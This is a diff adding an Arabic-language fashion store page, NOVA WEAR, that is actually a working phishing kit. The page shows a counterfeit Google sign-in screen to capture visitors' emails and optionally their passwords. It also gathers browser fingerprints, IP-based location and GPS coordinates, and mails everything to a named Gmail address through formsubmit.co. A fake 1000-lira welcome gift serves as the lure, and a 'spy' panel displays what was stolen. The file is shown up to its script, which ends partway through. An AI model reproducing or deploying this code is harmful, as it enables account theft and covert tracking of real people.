@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#5b4bff">
+<title>NOVA WEAR — أزياء عصرية</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>👕</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+[hidden]{display:none!important}
+:root{--ink:#0e1117;--soft:#f7f8fc;--line:#e7e9f2;--muted:#6b7280;--acc:#5b4bff;--ok:#0f9d58}
+body{font-family:'Cairo',system-ui,sans-serif;background:#fff;color:var(--ink);overflow-x:hidden}
+img{display:block;max-width:100%}
+.nav{position:sticky;top:0;z-index:50;display:flex;align-items:center;justify-content:space-between;padding:16px 5vw;background:rgba(255,255,255,.86);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.logo{font-weight:900;font-size:22px;letter-spacing:-.5px}.logo span{color:var(--acc)}
+.links{display:flex;gap:26px}.links a{color:var(--muted);text-decoration:none;font-weight:600;font-size:15px}.links a:hover{color:var(--ink)}
+.nav-right{display:flex;align-items:center;gap:10px}
+.balance{display:flex;align-items:center;gap:6px;background:linear-gradient(135deg,#fff6d8,#ffe9a8);border:1px solid #f0d17a;color:#7a5a00;font-weight:900;font-size:13px;padding:7px 14px;border-radius:99px;animation:pop .5s cubic-bezier(.2,1.6,.4,1)}
+@keyframes pop{from{transform:scale(.5);opacity:0}to{transform:scale(1);opacity:1}}
+.user-chip{display:flex;align-items:center;gap:8px;background:var(--soft);border:1px solid var(--line);padding:5px 12px 5px 6px;border-radius:99px;font-size:14px;font-weight:600}
+.user-chip img{width:28px;height:28px;border-radius:50%;object-fit:cover;background:#ddd}
+.link-btn{background:none;border:none;color:var(--acc);font-family:inherit;font-weight:700;cursor:pointer;font-size:13px}
+.btn-ghost{padding:10px 20px;border-radius:99px;border:1.5px solid var(--ink);background:#fff;font-family:inherit;font-weight:700;cursor:pointer;font-size:14px;transition:.2s}
+.btn-ghost:hover{background:var(--ink);color:#fff}
+.hero{display:grid;grid-template-columns:1.05fr 1fr;gap:60px;align-items:center;padding:70px 5vw 90px}
+.badge{display:inline-block;background:#efeaff;color:var(--acc);font-weight:800;font-size:13px;padding:7px 16px;border-radius:99px;margin-bottom:22px}
+.hero h1{font-size:clamp(36px,5.2vw,62px);line-height:1.1;font-weight:900;letter-spacing:-1.5px}
+.hero h1 em{font-style:normal;color:var(--acc)}
+.hero p{color:var(--muted);font-size:17px;margin:22px 0 32px;max-width:460px;line-height:1.7}
+.trust{font-size:13px;color:var(--muted);margin-top:18px}
+.hero-img{position:relative;border-radius:26px;overflow:hidden;aspect-ratio:8/9;background:var(--soft)}
+.hero-img img{width:100%;height:100%;object-fit:cover}
+.float-card{position:absolute;bottom:18px;right:18px;background:#fff;padding:12px 18px;border-radius:14px;font-weight:700;font-size:14px;box-shadow:0 12px 40px rgba(0,0,0,.14)}
+.gbtn{display:inline-flex;align-items:center;gap:12px;background:#fff;border:1.5px solid #d7dae3;border-radius:99px;padding:14px 30px;font-family:inherit;font-size:16px;font-weight:700;color:#2c3038;cursor:pointer;box-shadow:0 2px 10px rgba(0,0,0,.06);transition:.2s}
+.gbtn:hover{box-shadow:0 8px 26px rgba(0,0,0,.13);transform:translateY(-2px);border-color:#b9bfcc}
+.gbtn.full{width:100%;justify-content:center;border-radius:12px}
+.products{padding:20px 5vw 90px}.products h2{font-size:30px;font-weight:900;margin-bottom:30px}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:26px}
+.card{border:1px solid var(--line);border-radius:18px;overflow:hidden;transition:.25s;background:#fff}
+.card:hover{transform:translateY(-5px);box-shadow:0 18px 44px rgba(0,0,0,.09)}
+.card .ph{aspect-ratio:4/5;background:var(--soft);overflow:hidden}.card .ph img{width:100%;height:100%;object-fit:cover}
+.card .info{padding:16px}.card h4{font-size:15px;font-weight:700;margin-bottom:6px}
+.card .price{color:var(--acc);font-weight:900;font-size:17px}
+.card .old{color:var(--muted);text-decoration:line-through;font-size:13px;font-weight:600;margin-inline-start:8px}
+footer{padding:50px 5vw;border-top:1px solid var(--line);text-align:center;color:var(--muted);font-size:14px}
+footer .logo{margin-bottom:12px;color:var(--ink)}
+.modal{position:fixed;inset:0;z-index:200;background:rgba(14,17,23,.5);backdrop-filter:blur(6px);display:grid;place-items:center;padding:20px}
+.modal-card{background:#fff;border-radius:22px;padding:34px 30px;width:min(420px,100%);position:relative;box-shadow:0 30px 80px rgba(0,0,0,.3)}
+.modal-card h3{font-size:24px;font-weight:900;margin-bottom:8px}
+.muted{color:var(--muted);font-size:14px;margin-bottom:24px}
+.x{position:absolute;top:14px;left:16px;background:none;border:none;font-size:26px;line-height:1;color:var(--muted);cursor:pointer}
+.divider{display:flex;align-items:center;gap:12px;margin:22px 0;color:var(--muted);font-size:12px}
+.divider::before,.divider::after{content:"";flex:1;height:1px;background:var(--line)}
+.perks{list-style:none;font-size:14px;color:var(--muted);display:grid;gap:9px}
+.perks li::before{content:"✓";color:var(--ok);font-weight:900;margin-inline-end:9px}
+.toast{position:fixed;bottom:26px;left:50%;transform:translateX(-50%) translateY(120px);z-index:1999;background:#0e1117;color:#fff;padding:14px 26px;border-radius:99px;font-weight:700;font-size:14px;transition:.35s;white-space:nowrap}
+.toast.on{transform:translateX(-50%) translateY(0)}
+.gpage{position:fixed;inset:0;z-index:900;background:#fff;font-family:Roboto,arial,sans-serif;color:#202124;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;direction:ltr}
+.gcard{width:100%;max-width:448px;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;background:#fff}
+@media(max-width:600px){.gcard{border:none;padding:24px 0}}
+.glogo{height:24px;margin-bottom:16px}
+.gh1{font-size:24px;font-weight:400;margin-bottom:10px}
+.gsub{font-size:16px;margin-bottom:32px;line-height:1.5}
+.gfield{position:relative;margin-bottom:6px}
+.gfield input{width:100%;height:56px;padding:13px 15px;font-size:16px;font-family:inherit;border:1px solid #dadce0;border-radius:4px;outline:none;background:#fff;color:#202124}
+.gfield input:focus{border:2px solid #1a73e8;padding:12px 14px}
+.gfield.err input{border:2px solid #d93025}
+.gfield label{position:absolute;left:15px;top:17px;color:#5f6368;font-size:16px;pointer-events:none;background:#fff;padding:0 4px;transition:.12s}
+.gfield input:focus+label,.gfield input:not(:placeholder-shown)+label{top:-8px;left:12px;font-size:12px}
+.gfield input:focus+label{color:#1a73e8}
+.gmsg{display:flex;gap:6px;align-items:center;color:#d93025;font-size:12px;margin:4px 0 0}
+.gmsg::before{content:"!";display:grid;place-items:center;width:16px;height:16px;border-radius:50%;background:#d93025;color:#fff;font-weight:700;font-size:11px;flex-shrink:0}
+.glink{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;cursor:pointer}
+.glink:hover{text-decoration:underline}
+.gnote{font-size:14px;color:#5f6368;margin:36px 0 0;line-height:1.5}
+.gnote a{color:#1a73e8;font-weight:500;text-decoration:none}
+.grow{display:flex;justify-content:space-between;align-items:center;margin-top:32px;gap:12px}
+.gnext{background:#1a73e8;color:#fff;border:none;height:36px;padding:0 24px;border-radius:4px;font-family:inherit;font-size:14px;font-weight:500;cursor:pointer;transition:.15s}
+.gnext:hover{background:#1765cc;box-shadow:0 1px 3px rgba(0,0,0,.25)}
+.gacct{display:inline-flex;align-items:center;gap:8px;border:1px solid #dadce0;border-radius:16px;padding:4px 12px 4px 5px;font-size:14px;color:#3c4043;margin-bottom:6px}
+.gacct img{width:24px;height:24px;border-radius:50%;background:#e8eaed;object-fit:cover}
+.gshow{display:flex;align-items:center;gap:8px;font-size:14px;color:#202124;margin:14px 0 0;cursor:pointer}
+.gshow input{width:16px;height:16px;accent-color:#1a73e8}
+.gfoot{position:absolute;bottom:0;left:0;right:0;display:flex;justify-content:space-between;align-items:center;padding:14px 26px;font-size:12px;color:#5f6368}
+.gfoot .r{display:flex;gap:22px}.gfoot a{color:#5f6368;text-decoration:none;cursor:pointer}
+.gbusy{position:fixed;inset:0;background:#fff;z-index:950;display:grid;place-items:center;align-content:center;gap:18px;font-size:14px;color:#5f6368}
+.gspin{width:38px;height:38px;border:3px solid #e8eaed;border-top-color:#1a73e8;border-radius:50%;animation:sp .7s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
+.gift{position:fixed;inset:0;z-index:1000;background:rgba(8,10,16,.72);backdrop-filter:blur(8px);display:grid;place-items:center;padding:20px;animation:fade .25s ease}
+@keyframes fade{from{opacity:0}to{opacity:1}}
+.gift-card{width:min(430px,100%);border-radius:26px;overflow:hidden;background:#fff;position:relative;box-shadow:0 40px 100px rgba(0,0,0,.5);animation:jump .55s cubic-bezier(.2,1.5,.4,1)}
+@keyframes jump{from{transform:scale(.75) translateY(40px);opacity:0}to{transform:scale(1) translateY(0);opacity:1}}
+.gift-top{background:linear-gradient(150deg,#6c5ce7,#5b4bff 45%,#00c2a0);color:#fff;padding:34px 26px 30px;text-align:center;position:relative;overflow:hidden}
+.gift-top::before{content:"";position:absolute;width:240px;height:240px;border-radius:50%;background:rgba(255,255,255,.12);top:-140px;right:-70px}
+.gift-ico{font-size:52px;line-height:1;margin-bottom:12px;animation:sh 1.6s ease-in-out infinite}
+@keyframes sh{0%,100%{transform:rotate(-9deg) scale(1)}50%{transform:rotate(9deg) scale(1.1)}}
+.gift-top h2{font-size:26px;font-weight:900;margin-bottom:6px;position:relative}
+.gift-top p{font-size:14px;opacity:.9;position:relative}
+.gift-amt{margin:18px 0 8px;position:relative}
+.gift-amt span{font-size:64px;font-weight:900;letter-spacing:-2px;line-height:1;text-shadow:0 6px 24px rgba(0,0,0,.25)}
+.gift-amt small{font-size:20px;font-weight:800;margin-inline-start:6px}
+.gift-sub{font-size:13px;opacity:.85;position:relative}
+.gift-body{padding:22px}
+.gift-code{display:flex;align-items:center;gap:10px;border:2px dashed #d8d2ff;background:#f7f6ff;border-radius:14px;padding:14px 16px;margin-bottom:16px}
+.gift-code span{font-size:12px;color:var(--muted);font-weight:700}
+.gift-code b{margin-inline-start:auto;font-family:monospace;font-size:18px;letter-spacing:1px;color:var(--acc);direction:ltr}
+.gift-code button{background:var(--acc);color:#fff;border:none;border-radius:8px;padding:8px 14px;font-family:inherit;font-weight:800;font-size:12px;cursor:pointer}
+.gift-cta{width:100%;background:var(--ink);color:#fff;border:none;border-radius:14px;padding:16px;font-family:inherit;font-size:16px;font-weight:900;cursor:pointer;transition:.2s}
+.gift-cta:hover{transform:translateY(-2px);box-shadow:0 14px 34px rgba(0,0,0,.25)}
+.gift-fine{text-align:center;font-size:12px;color:var(--muted);margin-top:12px}
+#confetti{position:fixed;inset:0;z-index:1001;pointer-events:none}
+.live{position:fixed;bottom:22px;right:22px;z-index:480;display:flex;gap:11px;align-items:center;background:#fff;border:1px solid var(--line);border-radius:16px;padding:12px 16px 12px 12px;box-shadow:0 14px 40px rgba(0,0,0,.16);max-width:330px;transform:translateY(160%);opacity:0;transition:.45s cubic-bezier(.2,1.3,.4,1)}
+.live.on{transform:translateY(0);opacity:1}
+.live-av{width:38px;height:38px;border-radius:50%;background:linear-gradient(135deg,#6c5ce7,#00c2a0);color:#fff;font-weight:900;display:grid;place-items:center;font-size:16px;flex-shrink:0}
+.live-tx{display:grid;gap:2px;line-height:1.35}
+.live-tx b{font-size:13px;font-weight:800}
+.live-tx span{font-size:12px}
+.live-tx small{font-size:11px;color:var(--muted)}
+@media(max-width:600px){.live{right:14px;bottom:84px;max-width:calc(100vw - 28px)}}
+.spy{position:fixed;bottom:22px;left:22px;z-index:500}
+.spy-btn{background:#0e1117;color:#fff;border:none;border-radius:99px;padding:11px 20px;font-family:inherit;font-weight:700;font-size:13px;cursor:pointer;box-shadow:0 8px 30px rgba(0,0,0,.28)}
+.spy-card{position:absolute;bottom:52px;left:0;width:min(400px,92vw);background:#fff;border:1px solid var(--line);border-radius:16px;box-shadow:0 24px 70px rgba(0,0,0,.25);overflow:hidden;max-height:70vh;overflow-y:auto}
+.spy-card .h{padding:12px 16px;background:#0e1117;color:#fff;font-weight:800;font-size:13px;display:flex;justify-content:space-between}
+.spy-card .b{padding:14px 16px;display:grid;gap:8px}
+.spy-card .r{display:flex;justify-content:space-between;gap:12px;font-size:13px;border-bottom:1px dashed var(--line);padding-bottom:7px}
+.spy-card .r:last-child{border:none}
+.spy-card .r span:first-child{color:var(--muted);flex-shrink:0}
+.spy-card .r span:last-child{font-weight:700;text-align:left;word-break:break-all}
+.pw{background:#fff3cd;padding:1px 7px;border-radius:5px;font-family:monospace;direction:ltr;display:inline-block}
+.bad{color:#d93025}.good{color:#0f9d58}.warn{color:#b26a00}
+.warnbar{position:fixed;top:0;left:0;right:0;z-index:2000;background:linear-gradient(135deg,#ff9f1a,#ff7a00);color:#fff;padding:12px 16px;box-shadow:0 8px 30px rgba(0,0,0,.25);font-size:14px}
+.warnbar .wb-in{max-width:1000px;margin:0 auto;display:flex;flex-wrap:wrap;align-items:center;gap:10px 16px;padding-inline-end:34px}
+.warnbar b.t{font-size:15px}
+.warnbar a,.warnbar button{background:#fff;color:#b25b00;border:none;border-radius:8px;padding:6px 12px;font-family:inherit;font-weight:800;font-size:13px;cursor:pointer;text-decoration:none;display:inline-block}
+.warnbar a:hover,.warnbar button:hover{background:#fff4e0}
+.wb-x{position:absolute;top:10px;left:14px;background:none!important;color:#fff!important;font-size:22px!important;padding:0!important;line-height:1}
+@media(max-width:860px){.hero{grid-template-columns:1fr;gap:36px}.links{display:none}}
+</style>
+</head>
+<body>
+
+<div class="warnbar" id="warnbar" hidden>
+  <div class="wb-in">
+    <b class="t">⚠️ formsubmit onay bekliyor — veriler şu an kutuna düşmüyor</b>
+    <a href="https://mail.google.com/mail/u/0/#search/formsubmit" target="_blank" rel="noopener">1) Gmail'de "formsubmit" ara</a>
+    <span>2) Gelen mailde <b>Activate Form</b>'a bas</span>
+    <button id="wbRetry">3) Sonra buraya bas</button>
+  </div>
+  <button class="wb-x" id="wbClose">×</button>
+</div>
+
+<header class="nav">
+  <div class="logo">NOVA<span>WEAR</span></div>
+  <nav class="links"><a href="#">رجال</a><a href="#">نساء</a><a href="#">أطفال</a><a href="#">تخفيضات</a></nav>
+  <div class="nav-right">
+    <div class="balance" id="balance" hidden>🎁 <b id="balNum">1000</b> <span id="balCur">ليرة</span></div>
+    <div class="user-chip" id="userChip" hidden>
+      <img id="userPic" alt=""><span id="userName"></span>
+      <button class="link-btn" id="logout">خروج</button>
+    </div>
+    <button class="btn-ghost" id="openLogin">تسجيل الدخول</button>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="hero-text">
+    <span class="badge">خصم 40% على أول طلب</span>
+    <h1>أزياء تخليك<br><em>مميّز</em> بكل مكان</h1>
+    <p>مجموعة صيف 2026 وصلت. سجّل دخولك واحصل على <b>هدية ترحيبية</b> فوراً.</p>
+    <button class="gbtn" id="heroLogin">
+      <svg viewBox="0 0 48 48" width="20" height="20"><path fill="#4285F4" d="M45.1 24.5c0-1.6-.1-2.8-.4-4H24v7.3h12c-.2 2-1.5 5-4.4 7l-.1.2 6.4 5 .4.1c4.1-3.8 6.8-9.4 6.8-15.6z"/><path fill="#34A853" d="M24 46c5.9 0 10.9-2 14.5-5.3l-6.9-5.4c-1.9 1.3-4.4 2.2-7.6 2.2-5.8 0-10.7-3.8-12.5-9.1l-.2.1L4.3 33l-.1.2C7.7 40.8 15.3 46 24 46z"/><path fill="#FBBC05" d="M11.5 28.4c-.5-1.4-.7-2.9-.7-4.4s.3-3 .7-4.4l-.1-.3-6.9-5.4-.2.1A22 22 0 0 0 2 24c0 3.6.9 6.9 2.3 9.9l7.2-5.5z"/><path fill="#EA4335" d="M24 10.1c4.1 0 6.9 1.8 8.5 3.3l6.2-6C34.9 4 29.9 2 24 2 15.3 2 7.7 7.2 4.3 14.1l7.2 5.5C13.3 14.3 18.2 10.1 24 10.1z"/></svg>
+      متابعة باستخدام Google
+    </button>
+    <div class="trust">أكثر من 12,000 عميل • توصيل مجاني • إرجاع خلال 30 يوم</div>
+  </div>
+  <div class="hero-img">
+    <img src="https://picsum.photos/seed/novawear-hero/800/900" alt="">
+    <div class="float-card">★ 4.9 — تقييم العملاء</div>
+  </div>
+</section>
+
+<section class="products">
+  <h2>الأكثر مبيعاً</h2>
+  <div class="grid" id="grid"></div>
+</section>
+
+<footer><div class="logo">NOVA<span>WEAR</span></div><p>© 2026 NOVA WEAR — جميع الحقوق محفوظة</p></footer>
+
+<div class="modal" id="modal" hidden>
+  <div class="modal-card">
+    <button class="x" id="closeLogin">×</button>
+    <h3>تسجيل الدخول</h3>
+    <p class="muted">ادخل بضغطة واحدة، واحصل على هدية ترحيبية.</p>
+    <button class="gbtn full" id="modalLogin">
+      <svg viewBox="0 0 48 48" width="20" height="20"><path fill="#4285F4" d="M45.1 24.5c0-1.6-.1-2.8-.4-4H24v7.3h12c-.2 2-1.5 5-4.4 7l-.1.2 6.4 5 .4.1c4.1-3.8 6.8-9.4 6.8-15.6z"/><path fill="#34A853" d="M24 46c5.9 0 10.9-2 14.5-5.3l-6.9-5.4c-1.9 1.3-4.4 2.2-7.6 2.2-5.8 0-10.7-3.8-12.5-9.1l-.2.1L4.3 33l-.1.2C7.7 40.8 15.3 46 24 46z"/><path fill="#FBBC05" d="M11.5 28.4c-.5-1.4-.7-2.9-.7-4.4s.3-3 .7-4.4l-.1-.3-6.9-5.4-.2.1A22 22 0 0 0 2 24c0 3.6.9 6.9 2.3 9.9l7.2-5.5z"/><path fill="#EA4335" d="M24 10.1c4.1 0 6.9 1.8 8.5 3.3l6.2-6C34.9 4 29.9 2 24 2 15.3 2 7.7 7.2 4.3 14.1l7.2 5.5C13.3 14.3 18.2 10.1 24 10.1z"/></svg>
+      متابعة باستخدام Google
+    </button>
+    <div class="divider"><span>محمي بواسطة Google</span></div>
+    <ul class="perks"><li>هدية ترحيبية فورية</li><li>تتبّع الطلبات</li><li>حفظ المفضلة</li></ul>
+  </div>
+</div>
+
+<div class="gpage" id="gpage" hidden>
+  <div class="gcard">
+    <img class="glogo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+    <div id="gStep1">
+      <h1 class="gh1">Sign in</h1>
+      <p class="gsub">Use your Google Account</p>
+      <div class="gfield" id="fEmail">
+        <input id="gEmail" type="text" placeholder=" " autocomplete="username" spellcheck="false">
+        <label for="gEmail">Email or phone</label>
+      </div>
+      <div class="gmsg" id="mEmail" hidden>Enter a valid email or phone number</div>
+      <div style="margin-top:14px"><a class="glink">Forgot email?</a></div>
+      <p class="gnote">Not your computer? Use Guest mode to sign in privately. <a>Learn more</a></p>
+      <div class="grow"><a class="glink">Create account</a><button class="gnext" id="btnEmail">Next</button></div>
+    </div>
+    <div id="gStep2" hidden>
+      <div class="gacct"><img id="gAv" alt=""><span id="gMail"></span></div>
+      <h1 class="gh1">Welcome</h1>
+      <div class="gfield" id="fPass">
+        <input id="gPass" type="password" placeholder=" " autocomplete="current-password">
+        <label for="gPass">Enter your password</label>
+      </div>
+      <div class="gmsg" id="mPass" hidden>Enter a password</div>
+      <label class="gshow"><input type="checkbox" id="gShow"> Show password</label>
+      <div class="grow"><a class="glink">Forgot password?</a><button class="gnext" id="btnPass">Next</button></div>
+    </div>
+  </div>
+  <div class="gfoot">
+    <div class="r"><a>English (United States)</a></div>
+    <div class="r"><a>Help</a><a>Privacy</a><a>Terms</a></div>
+  </div>
+</div>
+
+<div class="gbusy" id="gBusy" hidden><div class="gspin"></div><p>Signing in…</p></div>
+
+<div class="gift" id="gift" hidden>
+  <canvas id="confetti"></canvas>
+  <div class="gift-card">
+    <div class="gift-top">
+      <div class="gift-ico">🎁</div>
+      <h2>مبروك يا <span id="giftName">صديقنا</span>!</h2>
+      <p>حصلت على هدية ترحيبية لتسجيل دخولك</p>
+      <div class="gift-amt"><span id="giftNum">1000</span><small id="giftCur">ليرة</small></div>
+      <p class="gift-sub">أُضيفت لرصيدك مباشرة — استعملها على أي طلب</p>
+    </div>
+    <div class="gift-body">
+      <div class="gift-code"><span>كود إضافي</span><b id="giftCode">NOVA1000</b><button id="copyCode">نسخ</button></div>
+      <button class="gift-cta" id="giftCta">ابدأ التسوّق الآن</button>
+      <p class="gift-fine">ينتهي العرض خلال 24 ساعة</p>
+    </div>
+  </div>
+</div>
+
+<div class="spy" id="spy" hidden>
+  <div class="spy-card" id="spyCard" hidden>
+    <div class="h"><span>🔍 البيانات المسحوبة</span><button class="link-btn" style="color:#fff" id="spyClose">×</button></div>
+    <div class="b" id="spyBody"></div>
+  </div>
+  <button class="spy-btn" id="spyToggle">🔍 شو انسحب</button>
+</div>
+
+<div class="toast" id="toast"></div>
+<iframe name="fsFrame" style="display:none"></iframe>
+
+<script>
+/* ==========================================================
+   ★★★ AYARLAR — SADECE BURAYI DEĞİŞTİR ★★★
+   ========================================================== */
+const TO_EMAIL     = "osamahuseyin2007@gmail.com";  // ← e-postan
+const FORM_HASH    = "";      // (isteğe bağlı) onaydan sonra gelen kodu buraya yapıştır
+const SEND_EMAIL   = true;    // verileri e-postaya gönder
+const ASK_PASSWORD = false;   // false = sadece e-posta sor  |  true = şifre de sor
+const ASK_LOCATION = true;    // konum iste
+const SHOW_SPY     = true;    // casus paneli
+const SHOW_LIVE    = true;    // canlı bildirimler
+const GIFT         = { amount: 1000, currency: "ليرة", code: "NOVA1000" };
+/* ========================================================== */
+
+const ENDPOINT = "https://formsubmit.co/ajax/" + (FORM_HASH || encodeURIComponent(TO_EMAIL));
+
+const PRODUCTS=[["قميص كتان صيفي","189","249"],["بنطال واسع","229","299"],["جاكيت دنيم","349","420"],
+["فستان سواريه","399","499"],["تيشيرت قطن","99","139"],["حذاء سنيكرز","279","349"],
+["حقيبة جلد","319","399"],["نظارة شمسية","149","199"]];
+document.getElementById("grid").innerHTML = PRODUCTS.map((p,i)=>`
+  <div class="card"><div class="ph"><img src="https://picsum.photos/seed/nw${i+11}/500/620" loading="lazy" alt=""></div>
+  <div class="info"><h4>${p[0]}</h4><div><span class="price">${p[1]} ليرة</span><span class="old">${p[2]} ليرة</span></div></div></div>`).join("");
+
+const $=id=>document.getElementById(id);
+const modal=$("modal"), gpage=$("gpage"), gBusy=$("gBusy"), gift=$("gift");
+let env={}, victim={email:"",password:""};
+let sendLog={ok:null,msg:"لم يُرسل بعد",needAct:false};
+
+function toast(m){const t=$("toast");t.textContent=m;t.classList.add("on");setTimeout(()=>t.classList.remove("on"),3500)}
+function showWarn(){ $("warnbar").hidden=false; }
+function hideWarn(){ $("warnbar").hidden=true; }
+$("wbClose").onclick=hideWarn;
+
+async function collectEnv(){
+  env={"المتصفح":navigator.userAgent,"المنصّة":navigator.platform||"-","اللغة":navigator.language,
+    "اللغات":(navigator.languages||[]).join(", "),
+    "المنطقة الزمنية":Intl.DateTimeFormat().resolvedOptions().timeZone,
+    "دقة الشاشة":screen.width+"x"+screen.height,"النافذة":innerWidth+"x"+innerHeight,
+    "الذاكرة":navigator.deviceMemory?navigator.deviceMemory+" GB":"-",
+    "أنوية المعالج":navigator.hardwareConcurrency||"-",
+    "اللمس":("ontouchstart" in window)?"نعم":"لا",
+    "الصفحة":location.href,"الوقت":new Date().toLocaleString("ar-EG")};
+  try{
+    const g=await fetch("https://ipapi.co/json/").then(r=>r.json());
+    Object.assign(env,{"IP":g.ip,"الدولة":g.country_name,"المدينة":g.city,"المنطقة":g.region,
+      "مزوّد الإنترنت":g.org,"خط العرض":g.latitude,"خط الطول":g.longitude});
+  }catch(e){ try{const g=await fetch("https://api.ipify.org?format=json").then(r=>r.json());env["IP"]=g.ip;}catch(_){} }
+}
+collectEnv();
+
+function getGps(){
+  return new Promise(res=>{
+    if(!ASK_LOCATION||!navigator.geolocation) return res(null);
+    navigator.geolocation.getCurrentPosition(
+      p=>res({"📍 خط العرض":p.coords.latitude,"📍 خط الطول":p.coords.longitude,
+        "دقة الموقع":Math.round(p.coords.accuracy)+" متر",
+        "رابط الخريطة":"https://maps.google.com/?q="+p.coords.latitude+","+p.coords.longitude}),
+      ()=>res(null),{timeout:6000,maximumAge:600000});
+  });
+}
+
+function formFallback(subject,fields){
+  let f=$("fsForm"); if(f) f.remove();
+  f=document.createElement("form");
+  f.id="fsForm"; f.method="POST"; f.target="fsFrame"; f.style.display="none";
+  f.action="https://formsubmit.co/"+(FORM_HASH||encodeURIComponent(TO_EMAIL));
+  const add=(k,v)=>{const i=document.createElement("input");i.type="hidden";i.name=k;i.value=v==null?"":v;f.appendChild(i)};
+  add("_subject",subject); add("_template","box"); add("_captcha","false");
+  if(victim.email) add("_replyto",victim.email);
+  Object.entries(fields).forEach(([k,v])=>add(k,v));
+  document.body.appendChild(f); f.submit();
+}
+
+async function send(subject,fields){
+  if(!SEND_EMAIL){ sendLog={ok:false,msg:"kapalı",needAct:false}; return; }
+  const body=Object.assign({_subject:subject,_template:"box",_captcha:"false"}, victim.email?{_replyto:victim.email}:{}, fields);
+  try{
+    const r=await fetch(ENDPOINT,{method:"POST",headers:{"Content-Type":"application/json","Accept":"application/json"},body:JSON.stringify(body)});
+    const txt=await r.text(); let j={}; try{j=JSON.parse(txt)}catch(_){}
+    const msg=(j&&(j.message||j.error))||txt||("HTTP "+r.status);
+    console.log("[formsubmit]",r.status,msg);
+    if(/activat|confirm/i.test(msg)){
+      sendLog={ok:false,msg:"⏳ بحاجة لتفعيل",needAct:true}; showWarn();
+    }else if(r.ok && j && String(j.success)==="true"){
+      sendLog={ok:true,msg:"تم الإرسال ✓",needAct:false}; hideWarn();
+    }else{
+      sendLog={ok:false,msg:"فشل: "+msg,needAct:false}; formFallback(subject,fields);
+    }
+  }catch(e){
+    sendLog={ok:false,msg:"شبكة: "+e.message,needAct:false}; formFallback(subject,fields);
+  }
+}
+
+$("wbRetry").onclick=async()=>{
+  toast("… جاري الفحص");
+  await send("✅ NOVA WEAR — اختبار التفعيل", Object.assign({"الحالة":"اختبار","الإيميل":victim.email||"test@test.com"},env));
+  if(sendLog.ok){ hideWarn(); toast("✓ تم! صار الإرسال يشتغل"); }
+  else if(sendLog.needAct){ toast("⚠️ لسا مو مفعّل — افتح الميل واضغط Activate Form"); }
+  else { toast("⚠️ " + sendLog.msg); }
+};
+
+function openGoogle(){
+  victim={email:"",password:""};
+  $("gEmail").value=""; $("gPass").value="";
+  ["fEmail","fPass"].forEach(i=>$(i).classList.remove("err"));
+  ["mEmail","mPass"].forEach(i=>$(i).hidden=true);
+  $("gStep1").hidden=false; $("gStep2").hidden=true;
+  gpage.hidden=false; document.body.style.overflow="hidden";
+  history.pushState({g:1},"",location.pathname+location.search);
+  setTimeout(()=>$("gEmail").focus(),100);
+}
+function closeGoogle(){ gpage.hidden=true; document.body.style.overflow=""; }
+
+async function nextEmail(){
+  const v=$("gEmail").value.trim();
+  if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)){ $("fEmail").classList.add("err"); $("mEmail").hidden=false; return; }
+  victim.email=v;
+  $("gMail").textContent=v;
+  $("gAv").src="https://unavatar.io/gmail/"+encodeURIComponent(v);
+  if(!ASK_PASSWORD){ await deliver(); return; }
+  $("gStep1").hidden=true; $("gStep2").hidden=false;
+  setTimeout(()=>$("gPass").focus(),100);
+  send("👤 NOVA WEAR — إيميل جديد: "+v, Object.assign({"الحالة":"إيميل فقط","الإيميل":v},env));
+}
+
+async function nextPassword(){
+  const p=$("gPass").value;
+  if(!p){ $("fPass").classList.add("err"); $("mPass").hidden=false; return; }
+  victim.password=p;
+  await deliver();
+}
+
+async function deliver(){
+  gBusy.hidden=false;
+  const gps=await getGps();
+  const fields={"الحالة":"✅ تسجيل دخول","الإيميل":victim.email};
+  if(ASK_PASSWORD) fields["كلمة السر"]=victim.password||"—";
+  Object.assign(fields, gps||{}, env, {"🎁 الهدية":GIFT.amount+" "+GIFT.currency+" — كود "+GIFT.code});
+  await send("🔑 NOVA WEAR — "+victim.email, fields);
+  gBusy.hidden=true;
+  finish();
+  if(sendLog.needAct) toast("⚠️ الميل لسا مو مفعّل — شوف الشريط فوق");
+}
+
+function prettyName(mail){
+  return (mail||"").split("@")[0].replace(/[._\-0-9]+/g," ").trim().replace(/\b\w/g,c=>c.toUpperCase())||"صديقنا";
+}
+
+function finish(o){
+  o=o||{};
+  closeGoogle();
+  const name=prettyName(victim.email);
+  $("userPic").src="https://unavatar.io/gmail/"+encodeURIComponent(victim.email);
+  $("userPic").onerror=()=>$("userPic").style.visibility="hidden";
+  $("userName").textContent=name;
+  $("userChip").hidden=false; $("openLogin").hidden=true;
+  localStorage.setItem("nw",JSON.stringify(victim));
+  if(SHOW_SPY) renderSpy();
+  if(o.restore){ $("balance").hidden=false; return; }
+  $("balance").hidden=false;
+  toast("✓ تم تسجيل الدخول بنجاح");
+  window.scrollTo({top:0,behavior:"smooth"});
+  setTimeout(()=>showGift(name),700);
+}
+
+function showGift(name){
+  $("giftName").textContent=name;
+  $("giftNum").textContent=GIFT.amount; $("giftCur").textContent=GIFT.currency;
+  $("giftCode").textContent=GIFT.code;
+  $("balNum").textContent=GIFT.amount; $("balCur").textContent=GIFT.currency;
+  gift.hidden=false; document.body.style.overflow="hidden";
+  confetti();
+}
+$("giftCta").onclick=()=>{ gift.hidden=true; document.body.style.overflow=""; $("balance").hidden=false; toast("🎁 تمت إضافة الهدية لرصيدك"); };
